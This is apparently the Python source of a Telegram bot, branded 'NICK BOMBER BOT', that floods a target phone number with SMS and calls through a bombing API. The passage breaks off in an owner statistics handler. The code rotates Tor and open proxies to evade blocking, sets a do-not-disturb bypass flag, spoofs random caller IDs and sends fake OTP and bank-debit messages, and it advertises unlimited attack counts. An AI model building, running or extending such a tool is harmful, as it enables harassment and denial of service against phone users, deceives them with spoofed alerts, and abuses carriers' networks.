# -*- coding: utf-8 -*-
"""
╔════════════════════════════════════════╗
║     NICK BOMBER BOT - KILLER EDITION  ║
║         Owner: @NICKPAPAJI            ║
║      Channel: @NICKPAPAJI1            ║
║         UNLIMITED VERSION             ║
╚════════════════════════════════════════╝
"""

import os
import logging
import asyncio
import aiohttp
import random
import time
import json
import re
import sqlite3
import threading
from datetime import datetime, timedelta
from typing import Dict, Optional
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityTextUrl
from telethon.errors import FloodWaitError, RPCError
from flask import Flask, request

# =============== CONFIG ===============
BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
OWNER_ID = int(os.environ.get('OWNER_ID', 7860365469))  # @NICKPAPAJI
OWNER_USERNAME = '@NICKPAPAJI'  # Telegram username
OWNER_DISPLAY = 'NICKPAPAJI'    # Display name
CHANNEL_USERNAME = '@NICKPAPAJI1'  # Join required channel
BOT_USERNAME = 'NickBomberRobot'   # Bot ka Telegram username

# API Endpoints (Extracted from callbomberz.in)
BASE_URL = "https://www.callbomberz.in/api/v2"
PROVIDERS = ['twilio', 'textbelt', 'msg91', 'way2sms', 'bulksmsgateway', 'nexmo', 'plivo', 'sinch']

# Proxy list (TOR + VPN rotation)
PROXIES = [
    {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'},
    {'http': 'http://45.154.254.123:8080', 'https': 'http://45.154.254.123:8080'},
    {'http': 'http://103.145.12.45:3128', 'https': 'http://103.145.12.45:3128'},
    {'http': 'http://198.54.132.88:8888', 'https': 'http://198.54.132.88:8888'},
    {'http': 'http://187.60.52.100:3128', 'https': 'http://187.60.52.100:3128'},
    {'http': 'http://41.57.96.134:8080', 'https': 'http://41.57.96.134:8080'},
]

# =============== SQLITE DATABASE ===============
def init_db():
    """Initialize SQLite database"""
    conn = sqlite3.connect('nick_bomber.db')
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  username TEXT,
                  joined_date TIMESTAMP,
                  total_bombs INTEGER DEFAULT 0,
                  total_calls INTEGER DEFAULT 0,
                  is_banned INTEGER DEFAULT 0,
                  channel_verified INTEGER DEFAULT 0)''')
    
    # Bomb logs table
    c.execute('''CREATE TABLE IF NOT EXISTS bomb_logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  type TEXT,
                  count INTEGER,
                  target TEXT,
                  date TIMESTAMP)''')
    
    # Daily limits table (just for stats, no blocking)
    c.execute('''CREATE TABLE IF NOT EXISTS daily_limits
                 (user_id INTEGER,
                  date TEXT,
                  sms_count INTEGER DEFAULT 0,
                  call_count INTEGER DEFAULT 0,
                  PRIMARY KEY (user_id, date))''')
    
    conn.commit()
    conn.close()
    print("✅ Database initialized!")

# Database helper functions
def add_user(user_id: int, username: str = None):
    """Add user to database"""
    conn = sqlite3.connect('nick_bomber.db')
    c = conn.cursor()
    
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    if not c.fetchone():
        c.execute("INSERT INTO users (user_id, username, joined_date, channel_verified) VALUES (?, ?, ?, ?)",
                  (user_id, username, datetime.now(), 0))
        conn.commit()
    conn.close()

def check_channel_join_db(user_id: int) -> bool:
    """Check if user has joined channel from DB"""
    conn = sqlite3.connect('nick_bomber.db')
    c = conn.cursor()
    
    c.execute("SELECT channel_verified FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    
    return result and result[0] == 1

def verify_user_channel(user_id: int):
    """Mark user as channel verified"""
    conn = sqlite3.connect('nick_bomber.db')
    c = conn.cursor()
    c.execute("UPDATE users SET channel_verified = 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def increment_sms_count_db(user_id: int, count: int = 1, target: str = ""):
    """Increment SMS count for stats (NO LIMIT)"""
    conn = sqlite3.connect('nick_bomber.db')
    c = conn.cursor()
    
    # Update total bombs
    c.execute("UPDATE users SET total_bombs = total_bombs + ? WHERE user_id = ?", (count, user_id))
    
    # Add to bomb logs
    c.execute("INSERT INTO bomb_logs (user_id, type, count, target, date) VALUES (?, ?, ?, ?, ?)",
              (user_id, 'SMS', count, target, datetime.now()))
    
    # Update daily stats (just for record)
    today = datetime.now().strftime('%Y-%m-%d')
    c.execute("INSERT INTO daily_limits (user_id, date, sms_count) VALUES (?, ?, ?) "
              "ON CONFLICT(user_id, date) DO UPDATE SET sms_count = sms_count + ?",
              (user_id, today, count, count))
    
    conn.commit()
    conn.close()

def increment_call_count_db(user_id: int, count: int = 1, target: str = ""):
    """Increment call count for stats (NO LIMIT)"""
    conn = sqlite3.connect('nick_bomber.db')
    c = conn.cursor()
    
    # Update total calls
    c.execute("UPDATE users SET total_calls = total_calls + ? WHERE user_id = ?", (count, user_id))
    
    # Add to bomb logs
    c.execute("INSERT INTO bomb_logs (user_id, type, count, target, date) VALUES (?, ?, ?, ?, ?)",
              (user_id, 'CALL', count, target, datetime.now()))
    
    # Update daily stats
    today = datetime.now().strftime('%Y-%m-%d')
    c.execute("INSERT INTO daily_limits (user_id, date, call_count) VALUES (?, ?, ?) "
              "ON CONFLICT(user_id, date) DO UPDATE SET call_count = call_count + ?",
              (user_id, today, count, count))
    
    conn.commit()
    conn.close()

def get_user_stats(user_id: int) -> dict:
    """Get user statistics"""
    conn = sqlite3.connect('nick_bomber.db')
    c = conn.cursor()
    
    # User info
    c.execute("SELECT username, total_bombs, total_calls, channel_verified FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    
    # Today's stats
    today = datetime.now().strftime('%Y-%m-%d')
    c.execute("SELECT sms_count, call_count FROM daily_limits WHERE user_id = ? AND date = ?", (user_id, today))
    daily = c.fetchone()
    
    conn.close()
    
    if user:
        return {
            'username': user[0],
            'total_bombs': user[1],
            'total_calls': user[2],
            'channel_verified': user[3],
            'today_sms': daily[0] if daily else 0,
            'today_calls': daily[1] if daily else 0
        }
    return None

def get_all_users():
    """Get all users for broadcast"""
    conn = sqlite3.connect('nick_bomber.db')
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    return [user[0] for user in users]

def get_bot_stats():
    """Get bot statistics for owner"""
    conn = sqlite3.connect('nick_bomber.db')
    c = conn.cursor()
    
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    
    c.execute("SELECT SUM(total_bombs) FROM users")
    total_sms = c.fetchone()[0] or 0
    
    c.execute("SELECT SUM(total_calls) FROM users")
    total_calls = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM users WHERE channel_verified = 1")
    verified = c.fetchone()[0]
    
    today = datetime.now().strftime('%Y-%m-%d')
    c.execute("SELECT COUNT(DISTINCT user_id) FROM daily_limits WHERE date = ?", (today,))
    active_today = c.fetchone()[0]
    
    conn.close()
    
    return {
        'total_users': total_users,
        'total_sms': total_sms,
        'total_calls': total_calls,
        'verified': verified,
        'active_today': active_today
    }

# =============== BOT CLIENT ===============
bot = TelegramClient('nick_bomber_bot', api_id=6, api_hash='eb06d4abfb49dc3eeb1aeb98ae0f581e')
bot.start(bot_token=BOT_TOKEN)

# =============== FLASK APP FOR RENDER ===============
app = Flask(__name__)

@app.route('/')
def home():
    return """
    <html>
        <head><title>NICK BOMBER BOT</title></head>
        <body style="background:black;color:lime;font-family:monospace;">
            <pre>
╔════════════════════════════════════════╗
║     NICK BOMBER BOT - KILLER EDITION  ║
║         Owner: @NICKPAPAJI            ║
║         Status: 🔥 ACTIVE             ║
║         UNLIMITED VERSION             ║
╚════════════════════════════════════════╝
            </pre>
        </body>
    </html>
    """

@app.route('/health')
def health():
    return {"status": "active", "timestamp": datetime.now().isoformat()}

# =============== BOMBER ENGINE ===============
class BomberEngine:
    def __init__(self):
        self.session = aiohttp.ClientSession()
        self.base_url = BASE_URL
        self.providers = PROVIDERS
        
    async def get_token(self) -> Optional[str]:
        """Get temporary token from API"""
        try:
            proxy = random.choice(PROXIES) if PROXIES else None
            
            async with self.session.post(
                f"{self.base_url}/auth/temp-token",
                headers={'User-Agent': 'CallBomberz/2.0'},
                proxy=proxy.get('http') if proxy and 'http' in proxy else None,
                timeout=10
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get('token')
        except Exception as e:
            logging.error(f"Token error: {e}")
        return None
    
    async def sms_bomb(self, phone: str, count: int = 50) -> Dict:
        """Execute SMS bombing"""
        token = await self.get_token()
        if not token:
            return {'success': False, 'message': 'Token generation failed'}
        
        headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        successful = 0
        failed = 0
        
        messages = [
            'OTP: 123456',
            'Your verification code: 789012',
            'Login attempt detected',
            'Payment received: ₹999',
            'Your OTP is 345678',
            'Bank alert: ₹5000 debited',
            'Amazon OTP: 567890',
            'Instagram login code: 432109',
            'WhatsApp code: 876543',
            'Google verification: 98765'
        ]
        
        for i in range(count):
            try:
                provider = random.choice(self.providers)
                proxy = random.choice(PROXIES) if PROXIES else None
                
                payload = {
                    'phone': phone,
                    'country_code': '91',
                    'provider': provider,
                    'bypass_dnd': True,
                    'priority': 'high',
                    'message': random.choice(messages)
                }
                
                async with self.session.post(
                    f"{self.base_url}/sms/send",
                    headers=headers,
                    json=payload,
                    proxy=proxy.get('http') if proxy and 'http' in proxy else None,
                    timeout=5
                ) as resp:
                    if resp.status == 200:
                        successful += 1
                    else:
                        failed += 1
                
                await asyncio.sleep(0.5)  # Speed increase (0.5 sec)
                
            except Exception as e:
                failed += 1
                logging.error(f"SMS error: {e}")
                continue
        
        return {
            'success': True,
            'type': 'SMS',
            'successful': successful,
            'failed': failed,
            'total': count
        }
    
    async def sms_bomb_with_progress(self, phone: str, count: int, status_msg) -> Dict:
        """Execute SMS bombing with progress updates"""
        token = await self.get_token()
        if not token:
            return {'success': False, 'message': 'Token failed'}
        
        headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json'
        }
        
        successful = 0
        failed = 0
        messages = ['OTP', 'Code', 'Alert', 'Payment', 'Login', 'Verify', 'Bank', 'Amazon', 'Google', 'WhatsApp']
        
        update_interval = max(1, count // 10)
        
        for i in range(count):
            try:
                provider = random.choice(self.providers)
                proxy = random.choice(PROXIES) if PROXIES else None
                
                payload = {
                    'phone': phone,
                    'country_code': '91',
                    'provider': provider,
                    'bypass_dnd': True,
                    'message': f"{random.choice(messages)}: {random.randint(100000, 999999)}"
                }
                
                async with self.session.post(
                    f"{self.base_url}/sms/send",
                    headers=headers,
                    json=payload,
                    proxy=proxy.get('http') if proxy and 'http' in proxy else None,
                    timeout=5
                ) as resp:
                    if resp.status == 200:
                        successful += 1
                    else:
                        failed += 1
                
                if (i + 1) % update_interval == 0:
                    progress = ((i + 1) / count) * 100
                    await status_msg.edit(
                        f"📱 **SMS Bombing Progress**\n\n"
                        f"Target: `+{phone}`\n"
                        f"Progress: {i+1}/{count} ({progress:.1f}%)\n"
                        f"━━━━━━━━━━━━━━━━━━━\n"
                        f"🟢 Sent: {successful}\n"
                        f"🔴 Failed: {failed}\n"
                        f"⚡ Speed: {(i+1)/((i+1)*0.5):.1f}/sec",
                        parse_mode='md'
                    )
                
                await asyncio.sleep(0.5)
                
            except Exception as e:
                failed += 1
                continue
        
        return {
            'success': True,
            'successful': successful,
            'failed': failed,
            'total': count
        }
    
    async def call_bomb(self, phone: str, count: int = 20) -> Dict:
        """Execute Call bombing"""
        token = await self.get_token()
        if not token:
            return {'success': False, 'message': 'Token failed'}
        
        headers = {'Authorization': f'Bearer {token}'}
        successful = 0
        failed = 0
        
        call_types = ['silent', 'ring', 'voip', 'flash', 'spoofed', 'international', 'anonymous']
        
        for i in range(count):
            try:
                proxy = random.choice(PROXIES) if PROXIES else None
                
                payload = {
                    'phone': phone,
                    'country_code': '91',
                    'call_type': random.choice(call_types),
                    'duration': random.randint(5, 30),
                    'provider': random.choice(self.providers),
                    'caller_id': f"+91{random.randint(7000000000, 9999999999)}"
                }
                
                async with self.session.post(
                    f"{self.base_url}/call/initiate",
                    headers=headers,
                    json=payload,
                    proxy=proxy.get('http') if proxy and 'http' in proxy else None,
                    timeout=5
                ) as resp:
                    if resp.status == 200:
                        successful += 1
                    else:
                        failed += 1
                
                await asyncio.sleep(1.5)  # 1.5 sec gap
                
            except Exception as e:
                failed += 1
                continue
        
        return {
            'success': True,
            'successful': successful,
            'failed': failed,
            'total': count
        }
    
    async def call_bomb_with_progress(self, phone: str, count: int, status_msg) -> Dict:
        """Execute call bombing with progress"""
        token = await self.get_token()
        if not token:
            return {'success': False, 'message': 'Token failed'}
        
        headers = {'Authorization': f'Bearer {token}'}
        successful = 0
        failed = 0
        call_types = ['silent', 'ring', 'voip', 'flash', 'spoofed']
        
        update_interval = max(1, count // 10)
        
        for i in range(count):
            try:
                proxy = random.choice(PROXIES) if PROXIES else None
                
                payload = {
                    'phone': phone,
                    'country_code': '91',
                    'call_type': random.choice(call_types),
                    'duration': random.randint(5, 25),
                    'provider': random.choice(self.providers),
                    'caller_id': f"+91{random.randint(7000000000, 9999999999)}"
                }
                
                async with self.session.post(
                    f"{self.base_url}/call/initiate",
                    headers=headers,
                    json=payload,
                    proxy=proxy.get('http') if proxy and 'http' in proxy else None,
                    timeout=5
                ) as resp:
                    if resp.status == 200:
                        successful += 1
                    else:
                        failed += 1
                
                if (i + 1) % update_interval == 0:
                    progress = ((i + 1) / count) * 100
                    await status_msg.edit(
                        f"📞 **Call Bombing Progress**\n\n"
                        f"Target: `+{phone}`\n"
                        f"Progress: {i+1}/{count} ({progress:.1f}%)\n"
                        f"━━━━━━━━━━━━━━━━━━━\n"
                        f"🟢 Connected: {successful}\n"
                        f"🔴 Failed: {failed}\n",
                        parse_mode='md'
                    )
                
                await asyncio.sleep(1.5)
                
            except Exception as e:
                failed += 1
                continue
        
        return {
            'success': True,
            'successful': successful,
            'failed': failed,
            'total': count
        }
    
    async def hybrid_bomb(self, phone: str, sms_count: int = 50, call_count: int = 25) -> Dict:
        """Execute both SMS and Call bombing"""
        sms_result = await self.sms_bomb(phone, sms_count)
        await asyncio.sleep(2)
        call_result = await self.call_bomb(phone, call_count)
        
        return {
            'success': True,
            'sms': sms_result,
            'call': call_result
        }
    
    async def close(self):
        await self.session.close()

bomber = BomberEngine()

# =============== TELEGRAM HANDLERS ===============
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    """Start command handler"""
    user_id = event.sender_id
    username = event.sender.username
    
    add_user(user_id, username)
    
    # Check channel join
    if not check_channel_join_db(user_id):
        buttons = [
            [Button.url('📢 Join Channel', f'https://t.me/{CHANNEL_USERNAME[1:]}')],
            [Button.inline('✅ I Have Joined', b'verify_join')]
        ]
        await event.reply(
            f"⚠️ **Access Denied!**\n\n"
            f"Maharaj {event.sender.first_name}, aapko pehle hamare channel ko join karna hoga:\n"
            f"👉 {CHANNEL_USERNAME}\n\n"
            f"**Owner:** @NICKPAPAJI",
            buttons=buttons,
            parse_mode='md'
        )
        return
    
    # Welcome message
    stats = get_user_stats(user_id)
    
    welcome_text = f"""
╔════════════════════════════════════════╗
║     NICK BOMBER BOT - KILLER EDITION  ║
║         Owner: @NICKPAPAJI            ║
║         UNLIMITED VERSION             ║
╚════════════════════════════════════════╝

🔥 **Welcome Maharaj {event.sender.first_name}!**

📊 **Your Stats:**
• User ID: `{user_id}`
• Total SMS: {stats['total_bombs']}
• Total Calls: {stats['total_calls']}
• Today SMS: {stats['today_sms']} (UNLIMITED)
• Today Calls: {stats['today_calls']} (UNLIMITED)

💣 **UNLIMITED Commands:**
/sms 91xxxxxxxxxx [count] - SMS bomb (NO LIMIT)
/call 91xxxxxxxxxx [count] - Call bomb (NO LIMIT)
/hybrid 91xxxxxxxxxx - Both attack
/status - Your stats
/owner - Contact owner

🚀 **Examples:**
`/sms 917894561230 1000` - 1000 SMS
`/call 917894561230 500` - 500 calls

**Powered by NICK AI - UNLIMITED** 😈🔥
    """
    
    await event.reply(welcome_text, parse_mode='md')

@bot.on(events.CallbackQuery(data=b'verify_join'))
async def verify_join_handler(event):
    """Verify channel join"""
    user_id = event.sender_id
    
    try:
        async with bot:
            user_entity = await bot.get_entity(user_id)
            channel = await bot.get_entity(CHANNEL_USERNAME)
            participant = await bot.get_permissions(channel, user_entity)
            
            if participant:
                verify_user_channel(user_id)
                await event.edit(
                    "✅ **Verification Successful!**\n\n"
                    "Ab aap unlimited bombing kar sakte hain!\n"
                    "Fir se /start press karo! 😈🔥",
                    buttons=None
                )
                return
    except:
        pass
    
    await event.answer(
        f"❌ Aapne abhi tak channel join nahi kiya!\n"
        f"Pehle {CHANNEL_USERNAME} join karo!",
        alert=True
    )

@bot.on(events.NewMessage(pattern='/sms(?: |@{}|)(?: +)?(\d{10,12})?(?: +)?(\d*)?'.format(BOT_USERNAME)))
async def sms_bomb_handler(event):
    """SMS bombing handler - UNLIMITED"""
    user_id = event.sender_id
    
    # Channel check
    if not check_channel_join_db(user_id):
        await event.reply(f"❌ Pehle {CHANNEL_USERNAME} join karo!")
        return
    
    # Parse phone and count
    phone = event.pattern_match.group(1)
    count = event.pattern_match.group(2)
    
    if not phone:
        await event.reply(
            "❌ **Wrong format!**\n\n"
            "Use: `/sms 917894561230 100`\n"
            "Example: `/sms 917845621350 1000`",
            parse_mode='md'
        )
        return
    
    # Validate phone
    phone = re.sub(r'\D', '', phone)
    if len(phone) < 10:
        await event.reply("❌ **Invalid phone number!**")
        return
    
    # UNLIMITED - Jitna bole utna
    try:
        bomb_count = int(count) if count else 50
    except:
        bomb_count = 50
    
    # Warnings for large numbers
    if bomb_count > 5000:
        buttons = [
            [Button.inline(f'💀 Ha Maharaj, {bomb_count} karo', f'confirm_sms_{phone}_{bomb_count}')],
            [Button.inline('❌ Cancel', 'cancel_bomb')]
        ]
        await event.reply(
            f"🚨 **MEGA BOMB WARNING!** 🚨\n\n"
            f"Aap **{bomb_count} SMS** bomb karne wale ho!\n"
            f"Target: `+{phone}`\n\n"
            f"⏱️ Time: ~{bomb_count//2} seconds\n"
            f"📊 Network Load: EXTREME\n\n"
            f"**Confirm karte ho?**",
            buttons=buttons,
            parse_mode='md'
        )
        return
    elif bomb_count > 1000:
        buttons = [
            [Button.inline(f'✅ Ha, {bomb_count} karo', f'confirm_sms_{phone}_{bomb_count}')],
            [Button.inline('❌ Cancel', 'cancel_bomb')]
        ]
        await event.reply(
            f"⚠️ **Heavy Bomb Warning!**\n\n"
            f"Aap {bomb_count} SMS bomb karne wale ho!\n"
            f"Target: `+{phone}`\n\n"
            f"Confirm?",
            buttons=buttons,
            parse_mode='md'
        )
        return
    
    # Direct execute
    await execute_sms_bomb(event, phone, bomb_count, user_id)

@bot.on(events.CallbackQuery(pattern=b'confirm_sms_(\\d+)_(\\d+)'))
async def confirm_sms_handler(event):
    """Confirm SMS bombing"""
    data = event.data.decode()
    parts = data.split('_')
    phone = parts[2]
    count = int(parts[3])
    user_id = event.sender_id
    
    await event.edit(f"✅ Starting {count} SMS bombing... 📱💣")
    await execute_sms_bomb(event, phone, count, user_id)

async def execute_sms_bomb(event, phone, bomb_count, user_id):
    """Execute SMS bombing"""
    # Use progress for large counts
    if bomb_count > 200:
        status_msg = await event.reply(
            f"📱 **SMS Bombing Started**\n\n"
            f"Target: `+{phone}`\n"
            f"Count: {bomb_count}\n"
            f"Status: **In Progress...**",
            parse_mode='md'
        )
        
        start_time = time.time()
        result = await bomber.sms_bomb_with_progress(phone, bomb_count, status_msg)
        elapsed = int(time.time() - start_time)
    else:
        status_msg = await event.reply(
            f"📱 **SMS Bombing**\nTarget: `+{phone}`\nCount: {bomb_count}\nPlease wait...",
            parse_mode='md'
        )
        
        start_time = time.time()
        result = await bomber.sms_bomb(phone, bomb_count)
        elapsed = int(time.time() - start_time)
    
    # Update stats
    increment_sms_count_db(user_id, result.get('successful', 0), phone)
    
    # Success rate
    success_rate = (result.get('successful', 0) / bomb_count) * 100 if bomb_count > 0 else 0
    
    await status_msg.edit(
        f"✅ **SMS Bombing Completed!**\n\n"
        f"📱 Target: `+{phone}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 Sent: {result.get('successful', 0)}\n"
        f"🔴 Failed: {result.get('failed', 0)}\n"
        f"📊 Success: {success_rate:.1f}%\n"
        f"⏱️ Time: {elapsed}s\n"
        f"⚡ Speed: {result.get('successful', 0)/elapsed:.1f}/sec\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"**Powered by NICK AI - UNLIMITED** 😈🔥",
        parse_mode='md'
    )

@bot.on(events.NewMessage(pattern='/call(?: |@{}|)(?: +)?(\d{10,12})?(?: +)?(\d*)?'.format(BOT_USERNAME)))
async def call_bomb_handler(event):
    """Call bombing handler - UNLIMITED"""
    user_id = event.sender_id
    
    # Channel check
    if not check_channel_join_db(user_id):
        await event.reply(f"❌ Pehle {CHANNEL_USERNAME} join karo!")
        return
    
    # Parse phone and count
    phone = event.pattern_match.group(1)
    count = event.pattern_match.group(2)
    
    if not phone:
        await event.reply(
            "❌ **Wrong format!**\n\n"
            "Use: `/call 917894561230 50`\n"
            "Example: `/call 917845621350 500`",
            parse_mode='md'
        )
        return
    
    # Validate phone
    phone = re.sub(r'\D', '', phone)
    if len(phone) < 10:
        await event.reply("❌ **Invalid phone number!**")
        return
    
    # UNLIMITED
    try:
        bomb_count = int(count) if count else 20
    except:
        bomb_count = 20
    
    # Warnings
    if bomb_count > 2000:
        buttons = [
            [Button.inline(f'💀 Ha Maharaj, {bomb_count} calls', f'confirm_call_{phone}_{bomb_count}')],
            [Button.inline('❌ Cancel', 'cancel_bomb')]
        ]
        await event.reply(
            f"🚨 **MEGA CALL BOMB WARNING!** 🚨\n\n"
            f"Aap **{bomb_count} calls** karne wale ho!\n"
            f"Target: `+{phone}`\n\n"
            f"⏱️ Time: ~{bomb_count*1.5} seconds\n"
            f"📞 Target ki phone jal jayegi!\n\n"
            f"**Confirm?**",
            buttons=buttons,
            parse_mode='md'
        )
        return
    elif bomb_count > 500:
        buttons = [
            [Button.inline(f'✅ Ha, {bomb_count} calls', f'confirm_call_{phone}_{bomb_count}')],
            [Button.inline('❌ Cancel', 'cancel_bomb')]
        ]
        await event.reply(
            f"⚠️ **Heavy Call Warning!**\n\n"
            f"Aap {bomb_count} calls karne wale ho!\n"
            f"Target: `+{phone}`\n\n"
            f"Confirm?",
            buttons=buttons,
            parse_mode='md'
        )
        return
    
    await execute_call_bomb(event, phone, bomb_count, user_id)

@bot.on(events.CallbackQuery(pattern=b'confirm_call_(\\d+)_(\\d+)'))
async def confirm_call_handler(event):
    """Confirm call bombing"""
    data = event.data.decode()
    parts = data.split('_')
    phone = parts[2]
    count = int(parts[3])
    user_id = event.sender_id
    
    await event.edit(f"✅ Starting {count} calls... 📞💣")
    await execute_call_bomb(event, phone, count, user_id)

async def execute_call_bomb(event, phone, bomb_count, user_id):
    """Execute call bombing"""
    if bomb_count > 200:
        status_msg = await event.reply(
            f"📞 **Call Bombing Started**\n\n"
            f"Target: `+{phone}`\n"
            f"Calls: {bomb_count}\n"
            f"Status: **Calling...**",
            parse_mode='md'
        )
        
        start_time = time.time()
        result = await bomber.call_bomb_with_progress(phone, bomb_count, status_msg)
        elapsed = int(time.time() - start_time)
    else:
        status_msg = await event.reply(
            f"📞 **Call Bombing**\nTarget: `+{phone}`\nCalls: {bomb_count}\nPlease wait...",
            parse_mode='md'
        )
        
        start_time = time.time()
        result = await bomber.call_bomb(phone, bomb_count)
        elapsed = int(time.time() - start_time)
    
    # Update stats
    increment_call_count_db(user_id, result.get('successful', 0), phone)
    
    # Success rate
    success_rate = (result.get('successful', 0) / bomb_count) * 100 if bomb_count > 0 else 0
    
    await status_msg.edit(
        f"✅ **Call Bombing Completed!**\n\n"
        f"📱 Target: `+{phone}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 Connected: {result.get('successful', 0)}\n"
        f"🔴 Failed: {result.get('failed', 0)}\n"
        f"📊 Success: {success_rate:.1f}%\n"
        f"⏱️ Time: {elapsed}s\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"**Powered by NICK AI - UNLIMITED** 😈🔥",
        parse_mode='md'
    )

@bot.on(events.NewMessage(pattern='/hybrid(?: |@{}|)(?: +)?(\d{10,12})?'.format(BOT_USERNAME)))
async def hybrid_bomb_handler(event):
    """Hybrid bombing"""
    user_id = event.sender_id
    
    # Channel check
    if not check_channel_join_db(user_id):
        await event.reply(f"❌ Pehle {CHANNEL_USERNAME} join karo!")
        return
    
    # Parse phone
    phone = event.pattern_match.group(1)
    
    if not phone:
        await event.reply(
            "❌ **Wrong format!**\n\n"
            "Use: `/hybrid 917894561230`",
            parse_mode='md'
        )
        return
    
    # Validate phone
    phone = re.sub(r'\D', '', phone)
    if len(phone) < 10:
        await event.reply("❌ **Invalid phone number!**")
        return
    
    # Ask for counts
    buttons = [
        [Button.inline('💣 Light (50 SMS + 25 Calls)', b'hybrid_light_' + phone.encode())],
        [Button.inline('🔥 Medium (100 SMS + 50 Calls)', b'hybrid_medium_' + phone.encode())],
        [Button.inline('💀 Heavy (500 SMS + 200 Calls)', b'hybrid_heavy_' + phone.encode())],
        [Button.inline('👑 Custom', b'hybrid_custom_' + phone.encode())]
    ]
    
    await event.reply(
        f"💥 **HYBRID ATTACK** 💥\n\n"
        f"Target: `+{phone}`\n\n"
        f"Choose power level:",
        buttons=buttons,
        parse_mode='md'
    )

@bot.on(events.CallbackQuery(pattern=b'hybrid_(\\w+)_(\\d+)'))
async def hybrid_choice_handler(event):
    """Handle hybrid choice"""
    data = event.data.decode()
    parts = data.split('_')
    level = parts[1]
    phone = parts[2]
    user_id = event.sender_id
    
    if level == 'light':
        sms, calls = 50, 25
    elif level == 'medium':
        sms, calls = 100, 50
    elif level == 'heavy':
        sms, calls = 500, 200
    else:
        await event.answer("Custom coming soon!")
        return
    
    await event.edit(f"✅ Starting HYBRID attack: {sms} SMS + {calls} calls...")
    
    status_msg = await event.reply(
        f"💥 **HYBRID ATTACK IN PROGRESS** 💥\n\n"
        f"Target: `+{phone}`\n"
        f"SMS: {sms}\n"
        f"Calls: {calls}\n"
        f"Status: **Attacking...**",
        parse_mode='md'
    )
    
    start_time = time.time()
    result = await bomber.hybrid_bomb(phone, sms, calls)
    elapsed = int(time.time() - start_time)
    
    # Update stats
    increment_sms_count_db(user_id, result['sms'].get('successful', 0), phone)
    increment_call_count_db(user_id, result['call'].get('successful', 0), phone)
    
    total_success = result['sms'].get('successful', 0) + result['call'].get('successful', 0)
    
    await status_msg.edit(
        f"✅ **HYBRID ATTACK COMPLETED!** ✅\n\n"
        f"📱 Target: `+{phone}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📨 **SMS:** {result['sms'].get('successful', 0)}/{sms}\n"
        f"📞 **Calls:** {result['call'].get('successful', 0)}/{calls}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **Total Success:** {total_success}\n"
        f"⏱️ **Time:** {elapsed}s\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"**Powered by NICK AI** 😈🔥",
        parse_mode='md'
    )

@bot.on(events.CallbackQuery(pattern=b'cancel_bomb'))
async def cancel_handler(event):
    """Cancel bombing"""
    await event.edit("❌ Bombing cancelled!")

@bot.on(events.NewMessage(pattern='/status'))
async def status_handler(event):
    """Check user status"""
    user_id = event.sender_id
    
    stats = get_user_stats(user_id)
    if not stats:
        await event.reply("❌ /start karo pehle!")
        return
    
    status_text = f"""
📊 **YOUR UNLIMITED STATUS**

👤 **User ID:** `{user_id}`
📛 **Username:** @{stats['username'] if stats['username'] else 'None'}

📈 **LIFETIME STATS:**
• Total SMS: {stats['total_bombs']}
• Total Calls: {stats['total_calls']}

📆 **TODAY:**
• SMS Today: {stats['today_sms']} (UNLIMITED)
• Calls Today: {stats['today_calls']} (UNLIMITED)

🔰 **Channel:** {'✅ Joined' if stats['channel_verified'] else '❌ Not Joined'}

**NO LIMITS - BOMB ANYTIME!** 😈🔥
    """
    
    await event.reply(status_text, parse_mode='md')

@bot.on(events.NewMessage(pattern='/owner'))
async def owner_handler(event):
    """Owner info"""
    await event.reply(
        f"""
👑 **OWNER INFORMATION**

📛 **Name:** NICKPAPAJI
🆔 **Telegram ID:** `{OWNER_ID}`
📢 **Username:** @NICKPAPAJI
📢 **Channel:** {CHANNEL_USERNAME}

🔥 **NICK AI Developer**
**Creator of NICK Bomber Bot**

📞 **Contact for:**
• Bug reports
• Feature requests
• Custom bots

**Powered by NICK AI - UNLIMITED** 😈
        """,
        parse_mode='md'
    )

@bot.on(events.NewMessage(pattern='/broadcast(?: +)?(.*)'))
async def broadcast_handler(event):
    """Broadcast message (owner only)"""
    if event.sender_id != OWNER_ID:
        return
    
    message = event.pattern_match.group(1)
    if not message:
        await event.reply("❌ Message do!")
        return
    
    status_msg = await event.reply("📢 Broadcasting...")
    
    users = get_all_users()
    success = 0
    failed = 0
    
    for user_id in users:
        try:
            await bot.send_message(
                user_id,
                f"📢 **Broadcast from Owner: NICKPAPAJI**\n\n{message}\n\n**- @NICKPAPAJI**"
            )
            success += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1
    
    await status_msg.edit(
        f"✅ **Broadcast Complete!**\n\n"
        f"📨 Sent: {success}\n"
        f"❌ Failed: {failed}\n"
        f"📊 Total: {len(users)}"
    )

@bot.on(events.NewMessage(pattern='/stats'))
async def bot_stats_handler(event):
    """Bot statistics (owner only)"""
    if event.sender_id != OWNER_ID:
        return
    
    stats = get_bot_stats()
    
    await event.reply(
        f"""
📊 **BOT STATISTICS**

👥 **Users:**
• Total: {stats['total_users']}
